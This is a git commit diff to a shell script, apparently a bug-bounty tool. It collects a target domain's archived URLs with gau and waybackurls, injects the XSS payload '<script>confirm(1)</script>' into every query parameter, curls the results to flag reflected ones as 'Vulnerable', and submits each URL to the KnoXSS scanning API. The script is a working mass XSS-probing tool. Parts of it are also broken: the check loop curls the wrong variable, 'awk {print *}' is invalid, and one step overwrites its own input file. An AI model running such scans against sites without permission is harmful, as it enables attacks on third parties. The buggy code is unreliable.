41deffc3c94b04466fec08d52ae5660181cd7fcd
Helloguru499 <60912676+Helloguru499@users.noreply.github.com>
2022-06-04 15:18:15 -0500

    Update fil-url.sh

--- fil-url.sh
+++ fil-url.sh
@@ -18,23 +18,47 @@ if [ -f $1-xss ] ; then
 fi
 
 START=$(date +%s)
-gau $1 --o $1-xss
+gau $1 --o $1-all-urls
 
 END=$(date +%s)
 
 timeexec=$(($END - $START))
-echo  -e "\033[31m******************GAU Has taken $timeexec seconds from our life**********************"
+echo  -e "\033[31m******************GAU Has taken $timeexec seconds from our life**********************\033[m"
 
-waybackurls $1 |tee -a $1-xss|qsreplace|tee $1-xss
+waybackurls $1 |tee -a $1-all-urls|qsreplace|tee $1-all-urls
 endtimes=$(date +%s)
 timeexecs=$(($endtimes - $START))
-echo -e "\033[32m*****************WAYBACKURLS has taken your time $timeexecs seconds********************"
+echo -e "\033[32m*****************WAYBACKURLS has taken your time $timeexecs seconds********************\033[m"
 
-cat $1-xss|grep "="|egrep -iv ".(css|jpg|gif|js|jpeg|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)|qsreplace|cut -d "?" -f 2|egrep -iv http|sort -u|tee $1-param
+cat $1-all-urls|grep "="|egrep -iv ".(css|jpg|gif|js|jpeg|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)"|qsreplace|cut -d "?" -f 2|egrep -iv http|sort -u|tee $1-param
 sed  -i 's/&/\n/g' $1-param
 
 for i in $(cat $1-param)
 do
-cat $1-xss |grep $i|head -n 1|tee -a $1-xss-final
+cat $1-all-urls |grep $i|head -n 1|tee -a $1-final
 done
-sort -u $1-xss-final -o $1-xss-final
+sort -u $1-final -o $1-final
+echo -e "\033[31m=======================checing xss one liner==============================\033[m"
+cat $1-final |qsreplace "<script>confirm(1)</script>"|tee $1-final
+sort -u $1-final -o $1-final
+for host in $(cat $1-final)
+do
+curl -s $i |grep -qs "<script>confirm(1)" && echo  -e "$host \033[31mVulnerable\n\033[m" ;
+done
+echo -e "\033[31m∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ONE LINER DONE NOW GOING FOR KNOXSS∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞\033[m"
+
+sleep 1
+awk {print *}
+sleep 1
+awk {print *}
+sleep 1
+awk {print *}
+sleep 1
+awk {print *}
+sleep 1
+awk {print *}
+echo -e "\033[31m∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞KNOXSS STARTING∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞\033[m"
+for i in $(cat $1-final)
+do
+curl https://knoxss.me/api/v3 -d target=$i -H 'X-API-KEY: ';
+done
